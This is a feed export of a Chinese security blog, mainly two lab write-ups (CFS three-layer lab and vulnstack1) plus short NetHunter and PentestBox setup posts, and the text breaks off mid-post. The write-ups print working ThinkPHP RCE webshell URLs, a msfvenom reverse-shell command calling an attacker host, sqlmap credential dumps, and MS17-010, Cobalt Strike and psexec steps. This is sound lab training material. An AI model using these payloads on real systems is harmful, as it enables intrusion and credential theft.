    <updated>2021-02-22T02:18:14.142Z</updated>
    
    <content type="html"><![CDATA[<p>尝试下cfs三层靶机渗透，接近实战环境，因为要建立多层代理</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>拓扑图</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210219162819273.png" alt="image-20210219162819273"></p><p>各主机账号密码</p><p>Centos：root/ teamssix.com </p><p>Ubuntu：root/ teamssix.com</p><p>Win7：administrator/teamssix.com</p><p>Centos配置网站centos和ubuntu主机需如下配置</p><a id="more"></a><p>http://靶机外网ip:8888/a768f109/</p><p><strong>账号：</strong>eaj3yhsl，<strong>密码：</strong>41bb8fee，根据实际靶机ip，配置网站</p><h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-T4</span> <span class="selector-tag">-O</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.19</span></span><br></pre></td></tr></table></figure><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210219163006337.png" alt="image-20210219163006337"></p><p>访问80端口为thinkphp</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210219163032951.png" alt="image-20210219163032951"></p><p>尝试payload</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.19/index.php?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=phpinfo&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=1</span><br></pre></td></tr></table></figure><p>存在漏洞</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210219163116499.png" alt="image-20210219163116499"></p><p>写入webshell</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.19</span>/index.php?<span class="keyword">s</span>=<span class="keyword">index</span>/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="number">0</span>]=file_put_contents&amp;vars[<span class="number">1</span>][]=shell.php&amp;vars[<span class="number">1</span>][]=%3C?php%20@eval($_GET[%22code%22])?%3Ei http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.19</span>/index.php?<span class="keyword">s</span>=<span class="keyword">index</span>/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="number">0</span>]=file_put_contents&amp;vars[<span class="number">1</span>][]=shell.php&amp;vars[<span class="number">1</span>][]=%3C?php%20@eval($_GET[%22code%22])?%3Ei</span><br><span class="line"><span class="comment">###注意结尾多了一个i</span></span><br></pre></td></tr></table></figure><p>查看写入成功</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094140826.png" alt="image-20210222094140826"></p><p>蚁剑连接失败</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094209040.png" alt="image-20210222094209040"></p><p>更换payload重新写入</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://192.168.1.19/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="string">0</span>]=system&amp;vars[1][]=echo%20%22%3C?php%20eval(\$<span class="emphasis">_POST[cmd]);?%3E%22%20%3Eshell.php</span></span><br></pre></td></tr></table></figure><p>写入成功，找到第一个flag</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094249920.png" alt="image-20210222094249920"></p><p>网络上还有另一种方法，我这边也来尝试下</p><p>Kali开启监听</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094507319.png" alt="image-20210222094507319"></p><p>反弹shell</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094456005.png" alt="image-20210222094456005"></p><p>使用python获取一枚 bash：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094547520.png" alt="image-20210222094547520"></p><p>找到第二个flag</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094613332.png" alt="image-20210222094613332"></p><p><code>uname -a</code>查看系统内核</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094633661.png" alt="image-20210222094633661"></p><p>尝试使用msf获取meterpreter</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.1</span><span class="number">.15</span> LPORT=<span class="number">4444</span> -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094754241.png" alt="image-20210222094754241"></p><p>成功后上传修改权限</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094731943.png" alt="image-20210222094731943"></p><p>成功获取shell并收集一些信息</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094814005.png" alt="image-20210222094814005"></p><h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>添加路由</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094913700.png" alt="image-20210222094913700"></p><p>使用<code>auxiliary/scanner/portscan/tcp</code>进行端口扫描探测</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094944830.png" alt="image-20210222094944830"></p><p>发现80端口放开</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095412834.png" alt="image-20210222095412834"></p><p>建立socks4a代理查看80端口内容</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095430702.png" alt="image-20210222095430702"></p><p>vim /etc/proxychains.conf</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095452316.png" alt="image-20210222095452316"></p><p>再来一波nmap端口探测</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">proxychains</span> <span class="selector-tag">nmap</span> <span class="selector-tag">-Pn</span> <span class="selector-tag">-sT</span> 192<span class="selector-class">.168</span><span class="selector-class">.192</span><span class="selector-class">.129</span></span><br><span class="line">##因为<span class="selector-tag">socket</span>代理不支持<span class="selector-tag">arp</span>，<span class="selector-tag">icmp</span>这种协议，所以用<span class="selector-tag">tcp</span>扫描</span><br></pre></td></tr></table></figure><p>扫描结果如下</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095552921.png" alt="image-20210222095552921"></p><p>外网连接代理，下图有点问题，协议应为socks而非http</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095642724.png" alt="image-20210222095642724"></p><p>可以访问，但访问不到网站</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095756811.png" alt="image-20210222095756811"></p><p>此时需要根据提示重新配置下环境</p><p><a href="http://192.168.192.129:8888/2cc52ec0/" target="_blank" rel="noopener">http://192.168.192.129:8888/2cc52ec0/</a></p><p>使用xdynr37d/766e248d无法登陆</p><p>直接在主机输入命令修改密码</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/www/server/panel</span> &amp;&amp; python tools.pyc panel testpasswd</span><br><span class="line"><span class="comment">##密码修改为testpasswd</span></span><br></pre></td></tr></table></figure><p>xdynr37d/testpasswd登陆</p><p>进行网站添加</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095940237.png" alt="image-20210222095940237"></p><p>再次访问成功</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095955024.png" alt="image-20210222095955024"></p><p>通过代理进行目录探测</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains dirb <span class="string">http:</span><span class="comment">//192.168.192.129</span></span><br></pre></td></tr></table></figure><p>部分扫描结果，发现robots.txt</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100041306.png" alt="image-20210222100041306"></p><p>查看robots.txt发现敏感信息</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100142236.png" alt="image-20210222100142236"></p><p>找到后台</p><p><a href="http://192.168.192.129/index.php?r=admini/public/login" target="_blank" rel="noopener">http://192.168.192.129/index.php?r=admini/public/login</a></p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100225044.png" alt="image-20210222100225044"></p><p>再查看首页源代码，发现注入点</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100310646.png" alt="image-20210222100310646"></p><p>kali下使用代理开启sqlmap</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains sqlmap <span class="string">"-u http://192.168.192.129/index.php?r=vul&amp;keyword=1"</span> -<span class="selector-tag">p</span> keyword</span><br></pre></td></tr></table></figure><p>发现注入漏洞</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100350846.png" alt="image-20210222100350846"></p><p>一步步渗透注入，最后获取用户密码</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">proxychains</span> sqlmap <span class="string">"-u http://192.168.192.129/index.php?r=vul&amp;keyword=1"</span> -p keyword -D <span class="keyword">bagecms </span>-T <span class="keyword">bage_admin </span>-C username,password –dump</span><br></pre></td></tr></table></figure><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100429097.png" alt="image-20210222100429097"></p><p>登陆后台找到第三个flag</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100450890.png" alt="image-20210222100450890"></p><p>在后台模版文件写shell</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100538199.png" alt="image-20210222100538199"></p><p>尝试写入webshell</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100709005.png" alt="image-20210222100709005"></p><p>讲蚁剑上传到kali，代理启动</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains <span class="string">./AntSword</span></span><br></pre></td></tr></table></figure><p><a href="http://192.168.192.129/index.php?r=tag" target="_blank" rel="noopener">http://192.168.192.129/index.php?r=tag</a></p><p>连接成功</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100834380.png" alt="image-20210222100834380"></p><p>找到第四个flag</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100853644.png" alt="image-20210222100853644"></p><p>连接非常不稳定，尝试下Kali自带的Webshell管理工具Weevely，发现更不稳定</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100931875.png" alt="image-20210222100931875"></p><p>尝试获取meterpreter，生成一个正向马去连接ubuntu</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=<span class="number">5555</span> -f elf &gt; <span class="number">5555.</span>elf</span><br></pre></td></tr></table></figure><p>代理形式打开msf，<code>proxychains msfconsole</code></p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101050169.png" alt="image-20210222101050169"></p><p>连接成功，获取meterpreter</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101151211.png" alt="image-20210222101151211"></p><p>查看网段信息</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101212102.png" alt="image-20210222101212102"></p><p>继续建立新的路由<code>run autoroute -s 192.168.33.0/24</code></p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101247682.png" alt="image-20210222101247682"></p><p>端口扫描</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101311165.png" alt="image-20210222101311165"></p><p>看扫描结果推测为windows主机</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101340357.png" alt="image-20210222101340357"></p><p>尝试使用smb协议探测，使用模块<code>auxiliary/scanner/smb/smb_version</code></p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101416808.png" alt="image-20210222101416808"></p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101433455.png" alt="image-20210222101433455"></p><p>445端口开放，再尝试ms17-010漏洞探测</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101507601.png" alt="image-20210222101507601"></p><p>存在漏洞</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101529006.png" alt="image-20210222101529006"></p><p>使用<code>exploit/windows/smb/ms17_010_psexec</code>进行权限获取</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101643982.png" alt="image-20210222101643982"></p><p>设置正向连接payload</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101707588.png" alt="image-20210222101707588"></p><p>获取权限成功</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101727151.png" alt="image-20210222101727151"></p><p>找到第五个flag</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101753208.png" alt="image-20210222101753208"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4MTkzNDIyMg==&amp;mid=2247488522&amp;idx=1&amp;sn=372d9a0ecf3926f84e9f4bc24c6040fd&amp;source=41#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI4MTkzNDIyMg==&amp;mid=2247488522&amp;idx=1&amp;sn=372d9a0ecf3926f84e9f4bc24c6040fd&amp;source=41#wechat_redirect</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;尝试下cfs三层靶机渗透，接近实战环境，因为要建立多层代理&lt;/p&gt;&lt;h3 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h3&gt;&lt;p&gt;拓扑图&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;//choge.top/2021/02/20/cfs三层靶机渗透/image-20210219162819273.png&quot; alt=&quot;image-20210219162819273&quot;&gt;&lt;/p&gt;&lt;p&gt;各主机账号密码&lt;/p&gt;&lt;p&gt;Centos：root/ teamssix.com &lt;/p&gt;&lt;p&gt;Ubuntu：root/ teamssix.com&lt;/p&gt;&lt;p&gt;Win7：administrator/teamssix.com&lt;/p&gt;&lt;p&gt;Centos配置网站centos和ubuntu主机需如下配置&lt;/p&gt;
    
    </summary>
    
    
      <category term="Penetration test" scheme="https://choge.top/categories/Penetration-test/"/>
    
    
      <category term="red team" scheme="https://choge.top/tags/red-team/"/>
    
  </entry>
  
  <entry>
    <title>vulnstack1靶机实战</title>
    <link href="https://choge.top/2021/02/19/vulnstack1%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/"/>
    <id>https://choge.top/2021/02/19/vulnstack1靶机实战/</id>
    <published>2021-02-19T07:36:05.000Z</published>
    <updated>2021-02-19T08:22:52.063Z</updated>
    
    <content type="html"><![CDATA[<p>尝试下vulnstack1的靶机实战</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p>密码：登录密码为hongrisec@2019 但是首次登陆必须改密码，密码改为hongrisec@2019.</p><p>拓扑图</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154153622.png" alt="image-20210219154153622"></p><p>vm1对应 win7，外网服务器，vm2对应win2003，vm3对应win2008</p><a id="more"></a><p>vm1设置两个网卡，一个自定义连接到VMnet1(仅主机模式)，另一个连接模式为NAT，方便连接外网。</p><p>vm2和vm3为仅主机模式</p><p>手工绘制拓扑图如下</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154211980.png" alt="image-20210219154211980"></p><p>vm1开启phpstudy</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154243444.png" alt="image-20210219154243444"></p><h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -P0 -p1<span class="number">-65535</span> -A -T4 <span class="number">172.16</span><span class="number">.237</span><span class="number">.6</span></span><br></pre></td></tr></table></figure><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154457223.png" alt="image-20210219154457223"></p><p>使用wufzz进行目录探测</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154527170.png" alt="image-20210219154527170"></p><p>竟然没扫到，使用dirmap工具爆破</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">dirmap</span><span class="selector-class">.py</span> <span class="selector-tag">-i</span> 172<span class="selector-class">.16</span><span class="selector-class">.237</span><span class="selector-class">.6</span> <span class="selector-tag">-lcf</span></span><br></pre></td></tr></table></figure><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154610114.png" alt="image-20210219154610114"></p><p>弱口令root/root进入进入phpmyadmin</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154635594.png" alt="image-20210219154635594"></p><p>phpmyAdmin后台写webshell，且是windows系统，尝试写shell</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154803569.png" alt="image-20210219154803569"></p><p>secure_file_priv的值为NULL，不能利用写into outfile写木马getshell</p><p>修改general_log为on</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154825715.png" alt="image-20210219154825715"></p><p>执行成功，可以看到路径</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154906265.png" alt="image-20210219154906265"></p><p>写入shell</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160539298.png" alt="image-20210219160539298"></p><p>蚁剑连接成功</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160558750.png" alt="image-20210219160558750"></p><p>生成cobalt strike马上传</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160623632.png" alt="image-20210219160623632"></p><p>执行cobaltstrike马，上线成功</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160649960.png" alt="image-20210219160649960"></p><h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>####信息收集</p><p>查看是否存在域 <code>ifconfig/all</code></p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160718328.png" alt="image-20210219160718328"></p><p>查看域信息 <code>net view</code></p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160732355.png" alt="image-20210219160732355"></p><p>查看主域信息：<code>net view /domain</code></p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160812019.png" alt="image-20210219160812019"></p><p>查看时间服务器：<code>net time /domain</code></p><p>未做进程注入，执行失败</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160853237.png" alt="image-20210219160853237"></p><p>查询当前的登录域与用户信息：<code>net config workstation</code></p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160926172.png" alt="image-20210219160926172"></p><p>查看当前域的所有用户：<code>net user /domain</code></p><p>未做进程注入，执行失败</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219160944742.png" alt="image-20210219160944742"></p><p>获取域内用户的详细信息：<code>wmic useraccount get /all</code></p><p>可以获取到用户名，描述信息，SID 域名等</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161018172.png" alt="image-20210219161018172"></p><p>查看所有域成员计算机列表：<code>net group &quot;domain computers&quot; /domain</code></p><p>未做进程注入 执行出错</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161041081.png" alt="image-20210219161041081"></p><p>查看域管理员：<code>net group &quot;domain admins&quot; /domain</code></p><p>未做进程注入执行出错</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161103742.png" alt="image-20210219161103742"></p><p>获取域密码信息：<code>net accounts /domain</code></p><p>未做进程注入执行出错</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161320857.png" alt="image-20210219161320857"></p><p>获取域信任信息 (cs 里执行提示不是内部或外部命令)：<code>nltest /domain_trusts</code></p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161338806.png" alt="image-20210219161338806"></p><h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><p>先前<code>net view</code>已经获取过信息</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161444240.png" alt="image-20210219161444240"></p><p>尝试下主机发现</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) DO @ping -w <span class="number">1</span> -n <span class="number">1</span> <span class="number">192.168</span><span class="number">.52</span>.%I | findstr <span class="string">"TTL="</span></span><br></pre></td></tr></table></figure><p>发现143为本机，发现141主机，感觉此操作不太行</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161529145.png" alt="image-20210219161529145"></p><p>使用Cobalt strike自带的端口扫描进行探测</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161619856.png" alt="image-20210219161619856"></p><p>发现138和141且都开启了445端口</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161648692.png" alt="image-20210219161648692"></p><p>抓取下141的hash</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161715474.png" alt="image-20210219161715474"></p><p>查看到抓取的密码和hash如下</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161738793.png" alt="image-20210219161738793"></p><p>尝试使用psexec使138和141上线</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161821460.png" alt="image-20210219161821460"></p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219162032313.png" alt="image-20210219162032313"></p><p>psexec64不行换成psexec成功，但是并未上线，因为处于内网环境</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219161933827.png" alt="image-20210219161933827"></p><p>cobalt strike建立smb listen上线</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219162105147.png" alt="image-20210219162105147"></p><p>再次使用psexec上线成功</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219162138461.png" alt="image-20210219162138461"></p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219162148073.png" alt="image-20210219162148073"></p><p>同样的方式再次上线另一台</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219162215665.png" alt="image-20210219162215665"></p><p>至此已拿下域控</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219162230159.png" alt="image-20210219162230159"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://v0w.top/2020/07/19/vulnstack1/#psexec-%E4%BD%BF%E7%94%A8%E5%87%AD%E8%AF%81%E7%99%BB%E5%BD%95%E5%85%B6%E4%BB%96%E4%B8%BB%E6%9C%BA" target="_blank" rel="noopener">https://v0w.top/2020/07/19/vulnstack1/#psexec-%E4%BD%BF%E7%94%A8%E5%87%AD%E8%AF%81%E7%99%BB%E5%BD%95%E5%85%B6%E4%BB%96%E4%B8%BB%E6%9C%BA</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;尝试下vulnstack1的靶机实战&lt;/p&gt;&lt;h3 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h3&gt;&lt;p&gt;地址：&lt;a href=&quot;http://vulnstack.qiyuanxuetang.net/vuln/detail/2/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://vulnstack.qiyuanxuetang.net/vuln/detail/2/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;密码：登录密码为hongrisec@2019 但是首次登陆必须改密码，密码改为hongrisec@2019.&lt;/p&gt;&lt;p&gt;拓扑图&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154153622.png&quot; alt=&quot;image-20210219154153622&quot;&gt;&lt;/p&gt;&lt;p&gt;vm1对应 win7，外网服务器，vm2对应win2003，vm3对应win2008&lt;/p&gt;
    
    </summary>
    
    
      <category term="Penetration test" scheme="https://choge.top/categories/Penetration-test/"/>
    
    
      <category term="red team" scheme="https://choge.top/tags/red-team/"/>
    
  </entry>
  
  <entry>
    <title>nexus5刷kali</title>
    <link href="https://choge.top/2020/12/24/NETHUNTER/"/>
    <id>https://choge.top/2020/12/24/NETHUNTER/</id>
    <published>2020-12-24T10:11:23.000Z</published>
    <updated>2021-02-19T07:34:12.242Z</updated>
    
    <content type="html"><![CDATA[<p>官方网址</p><p><a href="https://www.offensive-security.com/kali-linux-nethunter-download/" target="_blank" rel="noopener">https://www.offensive-security.com/kali-linux-nethunter-download/</a></p><p>按照自己手机对应下载型号</p><p>手机需要做一些准备工作</p><p>刷入第三方recovery，见之前教程</p><p>将下载的文件导入到手机</p><ol><li>长按 “手机音量－” ＋ “电源”，先进入fastboot模式，选择Recovery模式，按电源键（多按一会，否则容易直接重启一般模式）；<br>b）点击 INSTALL，选择 nethunter-hammerhead-marshmallow-kalifs-full-2019.4.zip，勾选完成后重启并进行刷入<br>i）刷入完毕后，自动重启，开机画面显示kali图案则为成功</li><li>然年进入nethunter app 初始化，最后执行terminal升级！！！</li><li>进入terminal后升级顺序，sudo apt-get update, sudo apt-get upgrade, sudo apt-get dist-upgrade, 反复多次</li><li>在dist-upgrade 时，提示kismet是否以root身份运行，选择no(因为选yes是不安全的)</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;官方网址&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.offensive-security.com/kali-linux-nethunter-download/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.offens
      
    
    </summary>
    
    
      <category term="Penetration test" scheme="https://choge.top/categories/Penetration-test/"/>
    
    
      <category term="Android" scheme="https://choge.top/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>记PentestBox安装</title>
    <link href="https://choge.top/2020/12/02/%E8%AE%B0PentestBox%E5%AE%89%E8%A3%85/"/>
    <id>https://choge.top/2020/12/02/记PentestBox安装/</id>
    <published>2020-12-02T08:33:19.000Z</published>
    <updated>2021-02-18T02:31:48.394Z</updated>
    
    <content type="html"><![CDATA[<p>安装后设置环境变量如下：</p><p><img src="//choge.top/2020/12/02/记PentestBox安装/image-20201203102444918.png" alt="image-20201203102444918"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\python</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\jdk1.8.0_74\bin</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\jdk1.8.0_74\jre\bin</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\ruby\bin</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\curl\bin</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\ruby\bin</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\get-pip</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\PortableGit\bin</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\Windows\System32</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\clink</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\clink-completions</span><br><span class="line"><span class="builtin-name">set</span> <span class="attribute">PATH</span>=C:\PentestBox\base\conemu-maximus5</span><br><span class="line"><span class="builtin-name">set</span> <span 